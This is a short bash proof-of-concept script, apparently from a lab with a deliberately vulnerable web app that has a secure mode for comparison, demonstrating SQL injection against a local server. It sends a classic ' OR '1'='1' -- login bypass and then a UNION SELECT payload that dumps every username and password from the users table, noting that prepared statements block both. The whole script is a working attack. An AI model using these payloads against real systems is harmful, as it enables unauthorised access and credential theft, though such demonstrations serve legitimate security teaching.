#!/usr/bin/env bash
# Vuln #2: SQL injection
set -euo pipefail
BASE="${1:-http://localhost:${PORT:-3000}}"
JAR=$(mktemp); trap 'rm -f "$JAR"' EXIT
CURL="curl -sk -b $JAR -c $JAR"

echo "== 1. auth bypass: login with  x' OR '1'='1' --"
$CURL -X POST "$BASE/api/login" -H 'Content-Type: application/json' \
  --data-raw "{\"username\":\"x' OR '1'='1' -- \",\"password\":\"irrelevant\"}"
echo

echo "== 2. dump all credentials via UNION in search"
$CURL -o /dev/null -X POST "$BASE/api/login" -H 'Content-Type: application/json' \
  --data-raw '{"username":"alice","password":"alicepass"}'
PAYLOAD="x%' UNION SELECT id, username, password FROM users -- "
$CURL -G "$BASE/api/notes" --data-urlencode "q=$PAYLOAD"
echo
echo "(SECURE mode returns bad credentials / [] — prepared statements neutralise both)"
